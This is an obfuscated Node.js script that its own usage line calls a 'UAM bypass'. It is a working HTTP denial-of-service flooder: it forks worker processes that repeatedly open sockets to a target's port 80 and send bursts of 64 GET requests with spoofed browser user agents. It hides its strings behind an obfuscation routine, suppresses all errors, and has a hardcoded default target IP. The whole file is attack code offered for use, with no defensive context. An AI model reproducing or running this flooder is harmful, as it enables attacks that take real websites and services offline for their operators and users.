var _0xc53951 = _0x43da;
(function (_0x462ce1, _0x6e6154) {
  var _0xe8ded6 = _0x43da, _0x261cc6 = _0x462ce1();
  while (true) {
    try {
      var _0x2fe6bd = parseInt(_0xe8ded6(328)) / 1 + -parseInt(_0xe8ded6(335)) / 2 * (parseInt(_0xe8ded6(333)) / 3) + -parseInt(_0xe8ded6(324)) / 4 + parseInt(_0xe8ded6(343)) / 5 + -parseInt(_0xe8ded6(342)) / 6 + -parseInt(_0xe8ded6(359)) / 7 + parseInt(_0xe8ded6(357)) / 8;
      if (_0x2fe6bd === _0x6e6154) break; else _0x261cc6.push(_0x261cc6.shift());
    } catch (_0x441138) {
      _0x261cc6.push(_0x261cc6.shift());
    }
  }
}(_0x46ae, 227058));
const fs = require("fs"), url = require(_0xc53951(351)), net = require("net"), cluster = require("cluster");
function _0x43da(_0x526e09, _0x40bb1c) {
  var _0x46aed6 = _0x46ae();
  return _0x43da = function (_0x43da2f, _0x3522f3) {
    _0x43da2f = _0x43da2f - 324;
    var _0x1d1594 = _0x46aed6[_0x43da2f];
    return _0x1d1594;
  }, _0x43da(_0x526e09, _0x40bb1c);
}
process[_0xc53951(344)][_0xc53951(349)] <= 3 && (console[_0xc53951(340)]("Bypass UAM https://stargate.cam only XD \n node UAM-BYPASS.js https://stargate.cam <threads> <time>"), process.exit(-1));
var target = process[_0xc53951(344)][2];
target === _0xc53951(360) && (target = _0xc53951(353));
var parsed = url.parse(target), host = url[_0xc53951(355)](target).host, threads = process[_0xc53951(344)][3], time = process[_0xc53951(344)][4];
function _0x46ae() {
  var _0x19f05b = ["events", "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko", "2802eWDKgU", "random", "96BKuCej", "data", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)", " HTTP/1.1\r\nHost: ", "uncaughtException", "log", "setMaxListeners", "1908870rTQuNH", "404575RHiaUb", "argv", "(!) Successfully started.", "net", "EventEmitter", "\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n", "length", "floor", "url", "exit", "http://45.95.55.105/", "destroy", "parse", "defaultMaxListeners", "9259224SdNUeY", "GET ", "2970002CCYfAT", "https://stargate.cam", "connect", "isMaster", "Socket", "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0", "1298160OifelV", "(!) Creating ", " thread", "write", "100543tctsdG", "setTimeout", "host"];
  _0x46ae = function () {
    return _0x19f05b;
  };
  return _0x46ae();
}
require(_0xc53951(331))[_0xc53951(347)][_0xc53951(356)] = 0, process[_0xc53951(341)](0), process.on(_0xc53951(339), function (_0x11d3fc) {}), process.on("unhandledRejection", function (_0x1fba62) {});
const userAgents = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko", _0xc53951(332), _0xc53951(364), _0xc53951(337)], nullHexs = ["", "?", "?", " "];
if (cluster[_0xc53951(362)]) {
  for (let i = 0; i < threads; i++) {
    cluster.fork(), console[_0xc53951(340)](_0xc53951(325) + i + _0xc53951(326));
  }
  console[_0xc53951(340)](_0xc53951(345)), setTimeout(() => {
    var _0x28077f = _0xc53951;
    process[_0x28077f(352)](1);
  }, time * 1e3);
} else startflood();
function startflood() {
  var _0x88205e = setInterval(() => {
    var _0xd76106 = _0x43da, _0x94b5ab = require(_0xd76106(346))[_0xd76106(363)]();
    _0x94b5ab[_0xd76106(361)](80, host), _0x94b5ab[_0xd76106(329)](2e4);
    for (var _0x49827f = 0; _0x49827f < 64; _0x49827f++) {
      _0x94b5ab[_0xd76106(327)](_0xd76106(358) + target + _0xd76106(338) + parsed[_0xd76106(330)] + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: " + userAgents[Math[_0xd76106(350)](Math[_0xd76106(334)]() * userAgents[_0xd76106(349)])] + _0xd76106(348));
    }
    _0x94b5ab.on(_0xd76106(336), function () {
      setTimeout(function () {
        var _0x490587 = _0x43da;
        return _0x94b5ab[_0x490587(354)](), delete _0x94b5ab;
      }, 5e3);
    });
  });
  setTimeout(() => clearInterval(_0x88205e), time * 1e4);
}
